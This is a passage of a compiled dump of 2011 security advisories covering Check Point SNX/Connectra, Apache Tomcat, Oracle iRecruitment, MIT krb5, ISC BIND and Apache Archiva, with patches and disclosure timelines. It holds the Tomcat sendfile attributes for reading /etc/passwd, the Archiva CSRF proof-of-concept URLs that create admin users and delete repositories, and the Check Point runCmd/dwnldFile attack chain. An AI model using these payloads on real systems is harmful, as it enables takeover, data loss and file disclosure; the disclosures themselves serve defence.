loggers, and Trojan horses are not installed on remote endpoints,
Connectra scans for these and other spyware through remote users’
browsers. By disabling spyware and enforcing baseline security
requirements before it grants SSL VPN access, Connectra stops identity
and password theft and prevents data loss.""
URL: http://www.checkpoint.com/products/connectra/
Vulnerability overview/description:
-----------------------------------
The client-side endpoint security solution (SSL Network Extender (SNX),
SecureWorkSpace and Endpoint Security On-Demand), e.g. supplied by a
Check Point Connectra or other Check Point security appliances on the
portal page, uses either a signed Java applet (called CShell or
Deployment Agent) or ActiveX control to perform local compliance scans
on the client.
Due to quality issues within the software, an attacker is able to access
insecure methods from the ""trustworthy"" Java applet or ActiveX control
and exploit those features to compromise all client systems that trust
the correctly signed Java applet or ActiveX control (e.g. all users
that need to use this software for accessing internal systems over
company VPN).
As SEC Consult does not provide free of charge quality assurance for
software vendors above providing information in advisories, no further
proof of concepts than this advisory / exploit have been created.
The Check Point Deployment agent Java applet or ActiveX control have a
""Secure Workspace"" (SWS) feature which is provided per default in
""sws.jar"" (or ""sws.cab""). This JAR-file is extracted to %TEMP%SWS
(Windows) or /tmp/SWS (Linux). It includes the executable CPSWS.exe and
some other XML and DLL files (side note: it is no workaround to remove
""sws.jar"" on the company Check Point Connectra appliance as this file
can also remotely be deployed or fetched).
Calling the public method ""CreatePackageURL"" it is possible for an
attacker to load the SWS feature/package. Afterwards ""RunPackageAction""
can be called to access the following actions of the ""Secure Workspace""
component:
1) runExeStart
2) runCmd
3) setXmlFile
4) dwnldFile
5) createCmdFile
The proof of concept uses ""dwnldFile"" and ""runCmd"" to upload an
arbitrary executable file and store it as ""CPSWS.exe"" within the
temporary directory of the victim's client system. Then ""runCmd"" is
being called to automatically run the new malicious ""CPSWS.exe"" and
compromise the client system.
So it's not just possible to execute commands on the clients but also to
choose one's own arbitrary malicious payload.
==>>
Summing up, an attacker is able to upload arbitrary executable files to
remote clients and then immediately execute them without notice as a
signed Java applet / ActiveX is being used (if ""Always trust content
from this publisher"" has been checked - otherwise an unsuspicious Java
digital signature verification popup will occur).
Possible attack vectors are drive-by downloads just by visiting
malicious websites but also through emails, any XSS on unsuspicious
websites, etc.
Proof of concept:
-----------------
The exploit will not be published, but a video demonstrating this issue
has been created. It can be found at the following URL:
https://www.sec-consult.com/files/110810_checkpoint_exploit.mp4
Vulnerable / tested versions:
-----------------------------
The Deployment agent component of the Check Point Connectra R66
appliance has been tested and successfully exploited. Furthermore, a
newer R70 has also been tested and found vulnerable.
Vulnerable signed Java applet certificate SHA1 fingerprint:
F6:40:1D:7B:67:08:3C:0F:3D:2A:9F:BC:69:E2:AD:6C:A5:D6:F5:8D
Vulnerable ActiveX control ""SlimClient Class"" Class ID:
{B4CB50E4-0309-4906-86EA-10B6641C8392}
Further information regarding affected Class ID and Oracle Java
Blacklist SHA1-Hashes can be found within the advisory of Check Point.
The following affected product/version information has been supplied by
Check Point:
- R65.70
- R70.40
- R71.30
- R75
- Connectra R66.1
- Connectra R66.1n
- VSX R65.20
- VSX R67
Vendor contact timeline:
------------------------
2011-03-31: Contacting Check Point security team
(security-alert checkpoint com), received auto-reply email
2011-03-31: Vendor: Very fast response, issue is being investigated,
Check Point will reply early next week
2011-04-03: Vendor: asking for further information, exploit setup
2011-04-04: Replying to vendor
2011-04-05: Vendor: confirmation of vulnerability, more information
end of week
2011-04-08: Asking for status
2011-04-09: Vendor: Working on the fix and release plan
2011-04-11: Asking for CVE number @MITRE
2011-04-12: Sending more details to MITRE, asking Check Point for
version numbers and affected products
2011-04-13 - 2011-04-22: Coordination with Check Point regarding
release and fix
2011-04-21: Contacting local CERT (Austria, Germany)
2011-04-25: Check Point releases their advisory including patches
2011-04-26: Asking again for CVE number
2011-05-26: Asking about status for Microsoft killbit patch
2011-05-29: Vendor: Microsoft did postpone patch from June to August
2011-08-08: Asking about status for patch; Vendor: MS publication
expected
2011-08-09: Microsoft publishes killbit patch
2011-08-10: Coordinated release of SEC Consult advisory
Solution:
---------
The following patches have been supplied by Check Point:
- Hotfix for R65.70
- Hotfix for R70.40
- Hotfix for R71.30
- Hotfix for R75
- Hotfix for Connectra R66.1
- Hotfix for Connectra R66.1n
- Hotfix for VSX R65.20
- Hotfix for VSX R67
For further information see the advisory of Check Point:
https://supportcenter.checkpoint.com/supportcenter/portal?eventSubmit_doGoviewsolutiondetails=&solutionid=sk62410
The following Microsoft Killbit Patch should be applied:
http://www.microsoft.com/technet/security/advisory/2562937.mspx
Workaround:
-----------
You should really apply the patches and invalidate the vulnerable
ActiveX control and Java applet.
Detailed information and a howto including tools can be found within the
advisory of Check Point.
Advisory URLs:
--------------
https://www.sec-consult.com/en/advisories.html
https://supportcenter.checkpoint.com/supportcenter/portal?eventSubmit_doGoviewsolutiondetails=&solutionid=sk62410
http://www.microsoft.com/technet/security/advisory/2562937.mspx
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SEC Consult Unternehmensberatung GmbH
Office Vienna
Mooslackengasse 17
A-1190 Vienna
Austria
Tel.: +43 / 1 / 890 30 43 - 0
Fax.: +43 / 1 / 890 30 43 - 25
Mail: research at sec-consult dot com
www.sec-consult.com
EOF J. Greil / @2011"
12163,[SECURITY] CVE-2011-2526 Apache Tomcat Information disclosure and availability vulnerabilities,,CVE-2011-2526,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2011-2526: Apache Tomcat Information disclosure and availability
vulnerabilities
Severity: low
Vendor:
The Apache Software Foundation
Versions Affected:
Tomcat 7.0.0 to 7.0.18
Tomcat 6.0.0 to 6.0.32
Tomcat 5.5.0 to 5.0.33
Previous, unsupported versions may be affected
Additionally, these vulnerabilities only occur when all of the following
are true:
a) untrusted web applications are being used
b) the SecurityManager is used to limit the untrusted web applications
c) the HTTP NIO or HTTP APR connector is used
d) sendfile is enabled for the connector (this is the default)
Description:
Tomcat provides support for sendfile with the HTTP NIO and HTTP APR
connectors. sendfile is used automatically for content served via the
DefaultServlet and deployed web applications may use it directly via
setting request attributes. These request attributes were not validated.
When running under a security manager, this lack of validation allowed a
malicious web application to do one or more of the following that would
normally be prevented by a security manager:
a) return files to users that the security manager should make inaccessible
b) terminate (via a crash) the JVM
Mitigation:
Affected users of all versions can mitigate these vulnerabilities by
taking any of the following actions:
a) undeploy untrusted web applications
b) switch to the HTTP BIO connector (which does not support sendfile)
c) disable sendfile be setting useSendfile=""false"" on the connector
d) apply the patch(es) listed on the Tomcat security pages (see references)
e) upgrade to a version where the vulnerabilities have been fixed
Tomcat 7.0.x users may upgrade to 7.0.19 or later once released
Tomcat 6.0.x users may upgrade to 6.0.33 or later once released
Tomcat 5.5.x users may upgrade to 5.5.34 or later once released
Example:
Exposing the first 1000 bytes of /etc/passwd
HttpServletRequest.setAttribute(
""org.apache.tomcat.sendfile.filename"",""/etc/passwd"");
HttpServletRequest.setAttribute(
""org.apache.tomcat.sendfile.start"",Long.valueOf(0));
HttpServletRequest.setAttribute(
""org.apache.tomcat.sendfile.end"",Long.valueOf(1000));
Specifying a end point after the end of the file will trigger a JVM
crash with the HTTP APR connector and an infinite loop with the HTTP NIO
connector.
Credit:
These issues were identified by the Tomcat security team.
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-7.html
http://tomcat.apache.org/security-6.html
http://tomcat.apache.org/security-5.html
The Apache Tomcat Security Team
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
iQIcBAEBAgAGBQJOHbrCAAoJEBDAHFovYFnnUZsQANIh02dK4r0cYCwsD59Xvg0R
cCpx0MCzsrVBKU/fJ5nQtVTtZnOVfH2PnZBPFlYxQXpBCgIQh+ZIp9ntGdSNP0kH
e7XgHaG6NipfIPusnQyH8yYmcfRl4BDnQdHyrl1JqApDtqnzPJ4Re9SVQC5VymJP
i9DlvuV4atAdSCgOZzBb3+wMV0uoZqjXcUZrQEXCYBhtGFtOQM/JyMUa7iu5+FhI
AuUchlHw3N+nZ+b4QeXGdFowHMTlJoj0gv5eMCEMVfiaoM5COcaQYBRQxkbNhkfN
7zkcKKyDG2ARIJ7WB3Ncj7A4RfF2KY98q69px6RU2ho8umOycl32dw3wT1AtPWUx
3TkTgkN4FXDprCLp1r/csbYO15GSoI0selWzKxmOOuMIIamQ36HreUInZzXohuOJ
VSdR/LBekdfiLNkNtIwK7oeaZoYqPT14F15C+gkzw8a7ETzN6kyYwZz2+dnnWvxM
lV5WhEksulVfrfro6OBFI4k4KVyCq/QYRUH2WfyaRyUhRB8of6tnweB46upzzoAU
+YtyLPimURofJbcw4Ut4VBvjVJTdts3air32vCKxpfnjdn9Gd3GH3phjrsYzJHTl
fg3RcqrmV9I0gxLn5oWIMx17gOGpFOgSwMyGgm/WEJLyiEV5suSPFVjMFq3znj+7
zAlePYK10YSe5XiZ9g8F
=MeHU
-----END PGP SIGNATURE-----"
12167,CVE-2010-2404 | Persistent Cross Site Scripting Vulnerability in Oracle I-Recruitment - E-Business Suite,,CVE-2010-2404,"Advisory: Persistent Cross Site Scripting Vulnerability in Oracle I-Recruitment File Uploading Module- E-Business Suite
CVE-2010-2404
Version Affected - 11.5.10.2, 12.0.6, 12.1.3
About: Oracle I-Recruitment Suite
Oracle iRecruitment is a web based full-cycle recruiting solution that
gives managers, recruiters and candidates the ability to manage every
phase of finding, recruiting, hiring, and tracking new employees. It is a
part of Oracle E-business suite.
Discussion:
A persistent cross site scripting vulnerability exists in the I-Recruitment
portal. The account information page allows the user to upload his resume in
Microsoft Word document. An attacker can construct a malicious MSWord file to
conduct XSS attack by setting XSS payload in hyperlinks in order to bypass
conversion filters.
For attack details , Refer to the following paper:
http://secniche.org/papers/SNS_09_01_Evad_Xss_Filter_Msword.pdf
Disclosure:
The vulnerability was disclosed to Oracle in January 2009 and is patched
in October 2010 CPU release.
Credit:
Aditya K Sood of SecNiche Security
Contact:
adi_ks [at] secniche.org
Disclaimer
The information in the advisory is believed to be accurate at the time of
publishing based on currently available information. Use of the
information constitutes acceptance for use in an AS IS condition. There is
no representation or warranties, either express or implied by or with
respect to anything."
12202,MITKRB5-SA-2011-005 FTP daemon fails to set effective group ID [CVE-2011-1526],,CVE-2011-1526,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
MITKRB5-SA-2011-005
MIT krb5 Security Advisory 2011-005
Original release: 2011-07-05
Topic: FTP daemon fails to set effective group ID
CVE-2011-1526
CVSSv2 Vector: AV:N/AC:L/Au:S/C:P/I:P/A:P/E:H/RL:O/RC:C
CVSSv2 Base Score: 6.5
Access Vector: Network
Access Complexity: Low
Authentication: Single
Confidentiality Impact: Partial
Integrity Impact: Partial
Availability Impact: Partial
CVSSv2 Temporal Score: 5.7
Exploitability: High
Remediation Level: Official Fix
Report Confidence: Confirmed
SUMMARY
=======
A remote client of the GSS-API FTP daemon in the krb5-appl
distribution can access files using the effective group ID that the
FTP daemon process had when it started.
IMPACT
======
An authenticated remote user can gain unauthorized read or write
access to files whose group owner is the initial effective group ID of
the FTP daemon process. This is often GID 0 (""root"" or ""wheel"").
The severity of the consequences depends heavily on the details of an
individual system's configuration. Prudent system administration
practices concerning file permissions will largely prevent any
malicious damage from this vulnerability.
No exploit code is necessary; any user able to log into the FTP server
will gain unauthorized access.
AFFECTED SOFTWARE
=================
* The GSS-API FTP daemon in all krb5-appl releases, up to and
including krb5-appl-1.0.1, is vulnerable.
FIXES
=====
* An upcoming release of krb5-appl will contain a fix.
* Apply the following patch. You will need to run ./autogen.sh to
rebuild the configure script, and you should rebuild from a clean
source tree to ensure that the correct macro definitions are
compiled.
diff --git a/configure.ac b/configure.ac
index 86e23f1..2fe68ad 100644
- --- a/configure.ac
+++ b/configure.ac
@@ -107,6 +107,7 @@ AC_CHECK_FUNCS(_getpty cgetent getcwd getenv gettosbyname getusershell getutmp)
AC_CHECK_FUNCS(getutmpx grantpt inet_aton initgroups isatty killpg killpg)
AC_CHECK_FUNCS(line_push ptsname revoke rmufile rresvport_af)
AC_CHECK_FUNCS(seteuid setlogin setpgid setpriority setresuid setreuid)
+AC_CHECK_FUNCS(setegid setregid setresgid)
AC_CHECK_FUNCS(setutent setutsent setutxent strsave tcgetpgrp tcsetpgrp)
AC_CHECK_FUNCS(ttyname unsetenv updwtmp updwtmpx utimes utmpname utmpxname)
AC_CHECK_FUNCS(vhangup vsnprintf waitpid)
diff --git a/gssftp/ftpd/ftpd.c b/gssftp/ftpd/ftpd.c
index fe62a9c..a150819 100644
- --- a/gssftp/ftpd/ftpd.c
+++ b/gssftp/ftpd/ftpd.c
@@ -994,9 +994,14 @@ login(passwd, logincode)
#endif
}
- - (void) krb5_setegid((gid_t)pw->pw_gid);
- - (void) initgroups(pw->pw_name, pw->pw_gid);
- -
+ if (krb5_setegid((gid_t)pw->pw_gid) < 0) {
+ reply(550, ""Can't set egid."");
+ goto bad;
+ }
+ if (geteuid() == 0 && initgroups(pw->pw_name, pw->pw_gid) < 0) {
+ reply(550, ""Can't initgroups"");
+ goto bad;
+ }
/* open wtmp before chroot */
(void) snprintf(ttyline, sizeof(ttyline), ""ftp%ld"", (long) getpid());
pty_logwtmp(ttyline, pw->pw_name, rhost_sane);
diff --git a/k5-util.h b/k5-util.h
index 7bb8cfb..64cd53d 100644
- --- a/k5-util.h
+++ b/k5-util.h
@@ -69,8 +69,7 @@
#elif defined(HAVE_SETREUID)
# define krb5_seteuid(EUID) setreuid(geteuid(), (uid_t)(EUID))
#else
- - /* You need to add a case to deal with this operating system.*/
- -# define krb5_seteuid(EUID) (errno = EPERM, -1)
+# error ""You need to add a case to deal with this operating system.""
#endif
#ifdef HAVE_SETEGID
@@ -80,8 +79,7 @@
#elif defined(HAVE_SETREGID)
# define krb5_setegid(EGID) (setregid(getegid(), (gid_t)(EGID)))
#else
- - /* You need to add a case to deal with this operating system.*/
- -# define krb5_setegid(EGID) (errno = EPERM, -1)
+# error ""You need to add a case to deal with this operating system.""
#endif
#endif
This patch is also available at
http://web.mit.edu/kerberos/advisories/2011-005-patch.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2011-005-patch.txt.asc
REFERENCES
==========
This announcement is posted at:
http://web.mit.edu/kerberos/advisories/MITKRB5-SA-2011-005.txt
This announcement and related security advisories may be found on the
MIT Kerberos security advisory page at:
http://web.mit.edu/kerberos/advisories/index.html
The main MIT Kerberos web page is at:
http://web.mit.edu/kerberos/index.html
CVSSv2:
http://www.first.org/cvss/cvss-guide.html
http://nvd.nist.gov/cvss.cfm?calculator&adv&version=2
CVE: CVE-2011-1526
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1526
ACKNOWLEDGMENTS
===============
We thank Tim Zingelman for discovering this vulnerability and
providing a preliminary patch.
CONTACT
=======
The MIT Kerberos Team security contact address is
<krbcore-security mit edu>. When sending sensitive information,
please PGP-encrypt it using the following key:
pub 2048R/56CD8F76 2010-12-29 [expires: 2012-02-01]
uid MIT Kerberos Team Security Contact <krbcore-security mit edu>
DETAILS
=======
The vulnerability results from two interacting flaws: omission of
required autoconf tests, causing krb5_setegid() to always fail, and
the FTP daemon's failure to check for the successful execution of
krb5_setegid().
The FTP daemon calls the portability macro krb5_setegid() from
k5-util.h, which is intended to wrap or emulate the POSIX interface
setegid(). The definition of the macro depends on macros that the
autoconf configure script defines (based on tests of the target
platform environment) when it runs. When the krb5 application
programs moved out of the main krb5 source tree, the new configure
script inadvertently omitted the necessary autoconf tests for
setegid() and related legacy interfaces. If no setegid() equivalent
appears to exist on the system, k5-util.h defines krb5_setegid() to
always fail with errno EPERM. Since the relevant autoconf tests never
execute, k5-util.h will always define krb5_setegid() to fail.
The FTP daemon does not check the return value of krb5_setegid(), so
it silently fails to set its effective GID, allowing users to gain
unauthorized access using the effective GID that the daemon process
started with.
REVISION HISTORY
================
2011-07-05 original release
Copyright (C) 2011 Massachusetts Institute of Technology
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.8 (SunOS)
iEYEARECAAYFAk4TT7IACgkQSO8fWy4vZo7ttQCglKWLu47znBVfeGXl3LlnZtF2
llIAoNgVuCYIdVWcMEJaZ0oBp9RxhkzJ
=RUE/
-----END PGP SIGNATURE-----"
12203,Security Advisory: CVE-2011-2465 ISC BIND 9 Remote Crash with Certain RPZ Configurations,,CVE-2011-2465,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
ISC BIND 9 Remote Crash with Certain RPZ Configurations
Two defects were discovered in ISC's BIND 9 code. These defects only affect
BIND 9 servers which have recursion enabled and which use a specific
feature of the software known as Response Policy Zones (RPZ) and where the
RPZ zone contains a specific rule/action pattern.
CVE: CVE-2011-2465
Document Version: 2.0
Posting date: 05 Jul 2011
Program Impacted: BIND
Versions affected: 9.8.0, 9.8.0-P1, 9.8.0-P2 and 9.8.1b1 Other versions of
BIND 9 not listed here are not vulnerable to this problem.
Severity: High
Exploitable: Remotely
Description:
A defect in the affected versions of BIND could cause the ""named"" process
to exit when queried, if the server has recursion enabled and was
configured with an RPZ zone containing certain types of records.
Specifically, these are any DNAME record and certain kinds of CNAME
records.
The patch release of BIND 9.8.0-P4 alters the behavior of RPZ zones by
ignoring any DNAME records in an RPZ zone, and correctly returning CNAME
records from RPZ zones.
Note that DNAME has no defined effect on the RPZ engine and its presence in
an RPZ zone is ignored. The definitive list of meaningful patterns in an
RPZ zone is given in the BIND 9 Administrative Reference Manual and also in
ISC Technical Note 2010-1.
CVSS Score: 7.8
CVSS Equation: (AV:N/AC:L/Au:N/C:N/I:N/A:C)
For more information on the Common Vulnerability Scoring System and to
obtain your specific environmental score please visit:
http://nvd.nist.gov/cvss.cfm?calculator&adv&version=2
Workarounds:
Do not put certain CNAME or any DNAME records into an RPZ zone file until
your software can be patched. If you subscribe to a service which supplies
your RPZ zone data, ensure that it does not contain any DNAME or certain
CNAME records. The CNAME records which must not be used are those which
signal the RPZ engine to rewrite query names. CNAME records which signal
the RPZ engine to forge an NXDOMAIN response are not affected by this
defect.
An example of an RPZ rule which causes a query name to be rewritten is:
*.malicious-domain.com CNAME walled-garden.isp.net
An example of an RPZ rule which causes an NXDOMAIN response to be returned
is:
*.malicious-domain.com CNAME .
Please refer to the BIND 9 Administrative Reference Manual or to ISC
Technical Note 2010-1 for more information about the Response Policy Zone
(RPZ) feature which was added to BIND 9 in Version 9.8.0.
Active exploits:
ISC received reports of this software flaw and verified the report's
accuracy.
Solution:
Upgrade to: 9.8.0-P4. (Note that 9.8.0-P3 is not affected but has been
replaced by 9.8.0-P4 due to CVE-2011-2464)
Download this version from the following location:
ISC releases of BIND 9 software may be downloaded from
http://www.isc.org/software/bind
If you do not obtain your BIND software directly from ISC, contact your
operating system or software vendor for an update.
If you are participating in ISC's Beta or release candidate (RC) program,
please upgrade. ISC Beta/RC testers are expected to remove vulnerable
versions and upgrade. No security advisories are issued for beta / release
candidates once the corresponding final release is made.
Acknowledgement: ISC thanks Bryce Moore from TELUS Security Labs for
finding and reporting this issue.
Document Revision History
Version 1.0 - 14 June 2011: Phase One Disclosure Date
Version 1.1 - 20 June 2011: Phase Two Disclosure Date with updates.
Version 1.2 - 21 June 2011: Updates on beta, RC, and clarity editing
Version 1.3 - 24 June 2011: Added document URL
Version 1.4 - 28 June 2011: Updated Solution and description (revised to
recommend 9.8.0-P4 per CVE-2011-2464)
Version 1.5 - 4 July 2011: Phase Three and Four Disclosure Date
Version 2.0 - 5 July 2011: Public Disclosure
References:
Do you have Questions? Questions regarding this advisory should go to
security-officer isc org.
Do you need Software Support? Questions on ISC's Support services or other
offerings should be sent to sales isc org. More information on
ISC's support and other offerings are available at:
http://www.isc.org/community/blog/201102/BIND-support
ISC Security Vulnerability Disclosure Policy Details of our current
security advisory policy and practice can be found here:
https://www.isc.org/security-vulnerability-disclosure-policy
Legal Disclaimer::
Internet Systems Consortium (ISC) is providing this notice on an ""AS IS""
basis. No warranty or guarantee of any kind is expressed in this notice and
none should be implied. ISC expressly excludes and disclaims any warranties
regarding this notice or materials referred to in this notice, including,
without limitation, any implied warranty of merchantability, fitness for a
particular purpose, absence of hidden defects, or of non-infringement. Your
use or reliance on this notice or materials referred to in this notice is
at your own risk. ISC may change this notice at any time.
A stand-alone copy or paraphrase of the text of this document that omits
the document URL is an uncontrolled copy. Uncontrolled copies may lack
important information, be out of date, or contain factual errors.
-----BEGIN PGP SIGNATURE-----
Version: 10.1.0.860
wsBVAwUBThMPGr2X3GOe6MR7AQp2AggAmi2YDtTTWeR+xn7RDRAZEY9OTO6yUUQI
vSgsOgwaeRKBdHf+PJiKFC8cd6wqSPyWH0QEUXhP4Rsh15ZUfLYJ4ELjSHDh70V6
uO5sXpJKkxxXZegoUAd8Hz2OzAYJkQkPfugP3K/8t8rSRjjtcyv+307q3I0zWvpO
X1UwBUA8w3AH+82zApAwNwBLBXo3auy93l89yERDVqIfEUkrbIZ7XkSWCs7bSRkE
JQMgvGscyqmHP4jXvWjI7IjK9Kpou67JRt2MXamuvJIhT4EHj7pMUPEa/RM+JjuJ
cV/70jhhFbhCP99UNf7uhFuWMjSmIPqugWYm7r/98afNyUxqIJSD/A==
=fTgK
-----END PGP SIGNATURE-----"
12204,Security Advisory: CVE-2011-2464 - ISC BIND 9 Remote packet Denial of Service against Authoritative and Recursive Servers,,CVE-2011-2464,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
ISC BIND 9 Remote packet Denial of Service against Authoritative and
Recursive Servers
A specially constructed packet will cause BIND 9 (""named"") to exit,
affecting DNS service.
CVE: CVE-2011-2464
Document Version: 2.0
Posting date: 05 Jul 2011
Program Impacted: BIND
Versions affected: 9.6.3, 9.6-ESV-R4, 9.6-ESV-R4-P1, 9.6-ESV-R5b1 9.7.0,
9.7.0-P1, 9.7.0-P2, 9.7.1, 9.7.1-P1, 9.7.1-P2, 9.7.2, 9.7.2-P1, 9.7.2-P2,
9.7.2-P3, 9.7.3, 9.7.3-P1, 9.7.3-P2, 9.7.4b1 9.8.0, 9.8.0-P1, 9.8.0-P2,
9.8.0-P3, 9.8.1b1
Severity: High
Exploitable: Remotely
Description:
A defect in the affected BIND 9 versions allows an attacker to remotely
cause the ""named"" process to exit using a specially crafted packet. This
defect affects both recursive and authoritative servers. The code location
of the defect makes it impossible to protect BIND using ACLs configured
within named.conf or by disabling any features at compile-time or run-time.
A remote attacker would need to be able to send a specially crafted packet
directly to a server running a vulnerable version of BIND. There is also
the potential for an indirect attack via malware that is inadvertently
installed and run, where infected machines have direct access to an
organization's nameservers.
CVSS Score: 7.8
(AV:N/AC:L/Au:N/C:N/I:N/A:C)
For more information on the Common Vulnerability Scoring System and to
obtain your specific environmental score please visit:
http://nvd.nist.gov/cvss.cfm?calculator&adv&version=2
Workarounds:
There are no known workarounds for publicly available servers.
Administrators of servers that are not publicly available may be able to
limit exposure via firewalls and packet filters.
Active exploits:
ISC knows of no public tools to exploit this defect at the time of this
advisory.
Solution:
Upgrade to: 9.6-ESV-R4-P3, 9.7.3-P3 or 9.8.0-P4.
Download these versions from the following locations:
ISC releases of BIND 9 software may be downloaded from
http://www.isc.org/software/bind
If you do not obtain your BIND software directly from ISC, contact your
operating system or software vendor for an update.
If you are participating in ISC's beta or release candidate (RC) programs,
please upgrade. ISC Beta/RC testers are expected to remove vulnerable
versions and upgrade. No security advisories are issued for beta / release
candidates once the corresponding final release is made.
In addition, 9.5.3b1 and 9.5.3rc1 are affected although ISC has not
released a final production version of 9.5.3. Note that BIND 9.5 is
End-of-Life, therefore if you are running a pre-release version of 9.5.3 we
recommend upgrading to a supported production version of BIND.
9.6-ESV-R4-P2 is not affected by any known attack vectors, but has been
replaced by 9.6-ESV-R4-P3 which carries a more complete fix
Other versions of BIND 9 not listed in this advisory are not vulnerable to
this problem.
Acknowledgements:
ISC thanks Roy Arends from Nominet for pin-pointing the exact nature of the
vulnerability. We also thank Ramesh Damodaran of Infoblox for finding a
variation of the attack vector and Mats Dufberg of TeliaSonera Sweden for
confirming additional variants.
Document Revision History:
Version 1.0 - 14 June 2011: Phase One Disclosure Date
Version 1.1 - 20 June 2011: Phase Two Disclosure Date with updates.
Version 1.2 - 21 June 2011: Updates on beta, RC, and clarity editing
Verison 1.3 - 21 June 2011: Sent Hold Notices to Phase I constituents,
extended Acknowledgments
Version 1.4 - 23 June 2011: Updated -P versions to include Advanced
Security Patches release to Phase I, and ""Upgrade to:"" versions
Version 1.5 - 24 June 2011: Added document URL, sent schedule update to
Phase I constituents.
Version 1.6 - 28 June 2011: Updated Versions Affected, extended
Acknowledgments, sent Phase I updates
Version 1.7 - 30 June 2011: Updated attribution text.
Version 1.8 - 4 July 2011: Phase Three and Four Disclosure Date
version 2.0 - 5 July 2011: Public Disclosure
Do you have Questions? Questions regarding this advisory should go to
security-officer isc org.
Do you need Software Support? Questions on ISC's Support services or other
offerings should be sent to sales isc org. More information on ISC's
support and other offerings are available at:
http://www.isc.org/community/blog/201102/BIND-support
ISC Security Vulnerability Disclosure Policy: Details of our current
security advisory policy and practice can be found here:
https://www.isc.org/security-vulnerability-disclosure-policy
Legal Disclaimer::
Internet Systems Consortium (ISC) is providing this notice on an ""AS IS""
basis. No warranty or guarantee of any kind is expressed in this notice and
none should be implied. ISC expressly excludes and disclaims any warranties
regarding this notice or materials referred to in this notice, including,
without limitation, any implied warranty of merchantability, fitness for a
particular purpose, absence of hidden defects, or of non-infringement. Your
use or reliance on this notice or materials referred to in this notice is
at your own risk. ISC may change this notice at any time.
A stand-alone copy or paraphrase of the text of this document that omits
the document URL is an uncontrolled copy. Uncontrolled copies may lack
important information, be out of date, or contain factual errors.
-----BEGIN PGP SIGNATURE-----
Version: 10.1.0.860
wsBVAwUBThMO/b2X3GOe6MR7AQrt6wf/bj9Cs1WtItSnQ37bSaCjh+FmVJSZLK/L
pzwTKR1Z4NS9riwDHRUgDtSHryT9fQfs4Nt8znpLUe9hyCXcMNy2uYScwyt9Rp1H
hbhauZkQFOQntHP7jc9X4Z6BrySk/YWhfWa2X74CGbt0dYKkpuxIXhfolzTCZ4C2
CK/M8Xgy6669F565GiAgUZu+AGPL3/uutvgCT0ywZXWojpAnkPMxKPNTU690+aQH
bUMVbIZ1HqwNHqFsu4DbGoPzFoSZuW6AyB1L7HNOt+Zt2dnL/ExxfpGi0VP+PAxm
a7Gg3aeC/qktygL3eRxeZ9p/ST8kp6vfSrdrHx3ovdn3ZeRsoiZDtA==
=ARbT
-----END PGP SIGNATURE-----"
12412,[CVE-2011-1026] Apache Archiva Multiple CSRF vulnerabilities,,CVE-2011-1026,"Hi,
This is regarding multiple CSRF (Cross Site Request Forgery)
Vulnerabilities in Apache Archiva 1.3.4 (and previous versions). The
following is the disclosure document
Title: Multiple CSRF Vulnerabilities in Apache Archiva 1.3.4
--------------------------------------------------------------------
Project: Apache Archiva
Severity: High
Versions: 1.3.0 - 1.3.4. The unsupported versions Archiva 1.0 - 1.2.2
are also affected.
Exploit type: Multiple CSRF
Mitigation: Archiva 1.3.4 and earlier users should upgrade to 1.3.5
Vendor URL: http://archiva.apache.org/security.html
CVE: CVE-ID-2011-1026
--------------------------------------------------------------------
Timeline:
28 February 2011: Vendor Contacted
1 March 2011: Vendor Response received. CVE-2011-1026 for CSRF Issues
Assigned.
7 March 2011: CVE-2011-1077 Assigned for XSS Issues.
14 March 2011: Fixes released to selected channels / Found to be
insufficient
27 May 2011: Vendor releases v1.3.5
27 May 2011: Vendor releases security disclosure to Bugtraq and FD.
30 May 2011: Exploit details released.
--------------------------------------------------------------------
Product Description:
Apache Archiva is an extensible repository management software that
helps taking care of your own personal or enterprise-wide build artifact
repository. It is the perfect companion for build tools such as Maven,
Continuum, and ANT.
Archiva offers several capabilities, amongst which remote repository
proxying, security access management, build artifact storage, delivery,
browsing, indexing and usage reporting, extensible scanning
functionality... and many more!
(Source: http://archiva.apache.org/)
--------------------------------------------------------------------
Vulnerability Details:
These issues allow an attacker to access and use the application with
the session of a logged on user. In this case if an administrative
account is exploited, total application compromise may be acheived.
An attacker can build a simple html page containing a hidden Image tag
(eg: <img src=vulnurl width=0 height=0 />) and entice the administrator
to access the page.
---------------------------------------------------------------------
Proof of Concept:
http://127.0.0.1:8080/archiva/security/usercreate!submit.action?user.use
rname=tester123&user.fullName=test&user.email=test%40test.com&user.passw
ord=abc&user.confirmPassword=abc
http://127.0.0.1:8080/archiva/security/userdelete!submit.action?username
=test
http://127.0.0.1:8080/archiva/security/addRolesToUser.action?principal=t
est&addRolesButton=true&__checkbox_addNDSelectedRoles=Guest&__checkbox_a
ddNDSelectedRoles=Registered+User&addNDSelectedRoles=System+Administrato
r&__checkbox_addNDSelectedRoles=System+Administrator&__checkbox_addNDSel
ectedRoles=User+Administrator&__checkbox_addNDSelectedRoles=Global+Repos
itory+Manager&__checkbox_addNDSelectedRoles=Global+Repository+Observer&s
ubmitRolesButton=Submit
http://127.0.0.1:8080/archiva/admin/deleteRepository.action?repoid=test&
method%3AdeleteContents=Delete+Configuration+and+Contents
http://127.0.0.1:8080/archiva/deleteArtifact!doDelete.action?groupId=1&a
rtifactId=1&version=1&repositoryId=snapshots
http://127.0.0.1:8080/archiva/admin/addRepositoryGroup.action?repository
Group.id=csrfgrp
http://127.0.0.1:8080/archiva/admin/deleteRepositoryGroup.action?repoGro
upId=test&method%3Adelete=Confirm
http://127.0.0.1:8080/archiva/admin/disableProxyConnector!disable.action
?target=maven2-repository.dev.java.net&source=internal
http://127.0.0.1:8080/archiva/admin/deleteProxyConnector!delete.action?t
arget=maven2-repository.dev.java.net&source=snapshots
http://127.0.0.1:8080/archiva/admin/deleteLegacyArtifactPath.action?path
=jaxen%2Fjars%2Fjaxen-1.0-FCS-full.jar
